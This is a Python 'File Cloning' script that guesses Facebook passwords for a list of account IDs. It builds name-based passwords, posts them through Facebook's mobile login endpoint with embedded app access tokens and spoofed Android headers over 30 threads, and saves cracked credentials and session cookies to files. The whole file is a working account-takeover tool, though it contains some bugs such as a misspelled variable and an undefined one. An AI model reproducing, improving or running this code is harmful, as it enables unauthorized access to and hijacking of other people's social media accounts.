#Coded by HANNAN . Modified by SIAM AHMED 
import os,time,random,re,sys,string, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe

try:
 import time,uuid,requests
except:
 os.system("pip install requests")

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'

logo=(f"""\u001b[1;96m
╔═╗╦╦  ╔═╗  ╔═╗╦═╗╔═╗╔═╗╦╔═
╠╣ ║║  ║╣   ║  ╠╦╝╠═╣║  ╠╩╗
╚  ╩╩═╝╚═╝  ╚═╝╩╚═╩ ╩╚═╝╩ ╩
\u001b[0;1m
Coded by Abdul Hannan Ansari
Modified by SIAM AHMED
""")

def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print('\33[1;37m---------------------------------')
def exit():
  sys.exit()

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"{oo(1)}File Cloning ")   
    print(f"{oo(0)}Exit")
    lin3()
    cp =input('[?] Choice : ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        main_menu() 
    method()
    exit()



"""
------Access Token------
Access Tokens. Change if necessary.

Ads Manager Android : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28
Facebook Android : 350685531728|62f8ce9f74b12f84c123cc23437a4a32
Facebook iPhone : 6628568379|c1e620fa708a1d5696fb991c1bde5662
Ads Manager App for iOS : 1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae

--------URL and Host--------
Graph : https://graph.facebook.com/auth/login/
B-Graph : https://b-graph.facebook.com/auth/login
"""


def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}Password : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] Total Accounts For CraCk : \033[1;32m '+str(len(idx)))
    print(f'\x1b[1;97m[✓] Dont Use Airplane mOde ;)')
    lin3()
    def start(user):
     try:
        global loop,idx,cll
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {R}[{W}HANNAN{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}• {G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              modellss=random.choice(mod)
              qp1a=f"QP1A.{random.randint(2000000,9999999)}.0{random.randint(10,99)}"
              fbpnnn=random.choice(['FB4A','Orca-Android','MessengerLite'])
              if fbpnnn == "FB4A":
                  fbpnn="katana"
              elif fbpnnn == "Orca-Android":
                  fbpnn="orca"
              elif fbpnnn == "MessengerLite":
                  fbpnn="mlite"
              heads=f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,14)}; {modellss} Build/{qp1a})"+f" [FBAN/{fbpnnn};FBAV/"+str(random.randrange(80,405))+".0.0."+str(random.randint(10,20))+"."+str(random.randint(80,150))+";FBBV/2"+str(random.randrange(100000,999999))+";FBDM/{density=4.0,width=1440,height=2392};FBLC/en_US;FBCR/Telennor;FBMF/LGE;FBBD/lge;FBPN/com.facebook.%s"+fbpnn+";FBDV/LG-D852;FBSV/5;FBOP/1;FBCA/arm64-v7a:]"#Put Your user Agent Here
              pswd = pswd.replace(f'first',first.lower()).replace(f'First',first).replace(f'last',last.lower()).replace(f'Last',last).replace(f'Name',name).replace(f'name',name.lower())
              header = {
    "Content-Type": "application/x-www-form-accencoded",
    "Host": "b-graph.facebook.com",
    "User-Agent": heads,
    "X-FB-Net-HNI": "45204",
    "X-FB-SIM-HNI": "45201",
    "X-FB-Connection-Type": "unknown",
    "X-Tigon-Is-Retry": "False",
    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
    "x-fb-device-group": "5120",
    "X-FB-Friendly-Name": "ViewerReactionsMutation",
    "X-FB-Request-Analytics-Tags": "graphservice",
    "Accept-Encoding": "gzip, deflate",
    "X-FB-HTTP-Engine": "Liger",
    "X-FB-Client-IP": "True",
    "X-FB-Server-Cluster": "True",
    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
    "Connection": "Keep-Alive",
              }

              data={
    "adid": str(uuid.uuid4()),
    "format": "json",
    "device_id": str(uuid.uuid4()),
    "cpl": "true",
    "family_device_id": str(uuid.uuid4()),
    "credentials_type": "device_based_login_password",
    "error_detail_type": "button_with_disabled",
    "source": "device_based_login",
    "email": acc,
    "password": pswd,
    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    "generate_session_cookies": "1",
    "meta_inf_fbmeta": "",
    "advertiser_id": str(uuid.uuid4()),
    "currently_logged_in_userid": "0",
    "locale": "en_US",
    "client_country_code": "US",
    "method": "auth.login",
    "fb_api_req_friendly_name": "authenticate",
    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
    "api_key": "882a8490361da98702bf97a021ddc14d",
              }

              response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False).json()
              if "session_key" in response:
                 cookie = ";".join(i["name"]+"="+i["value"] for i in reponse["session_cookies"])
                 #cookie=f"sb={''.join(random.choices(string.ascii_letters+string.digits+'_',k=24))};" +";".join(f"{i['name']}={i['value']}" for i in json.loads(response)["session_cookies"])
                 print('\033[1;32m[OK] \033[1;32m'+acc+' \033[1;32m|\033[1;32m '+pswd)
                 print(" [Cookie] ",cookie)
                 open('/sdcard/Hannan-Ok.txt','a').write(f'{acc}|{pswd}\n')
                 oku.append(acc)
                 break
              elif "User must verify their account" in response:
                print('\033[1;31m[CP] \033[1;31m'+acc+' \033[1;31m|\033[1;31m '+pswd)
                open('/sdcard/Hannan-CP.txt','a').write(f'{acc}|{pswd}\n')
                cpu.append(acc)
                break
              else:
                   continue   
     except Exception as e:
       time.sleep(10)
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()    


main_menu()
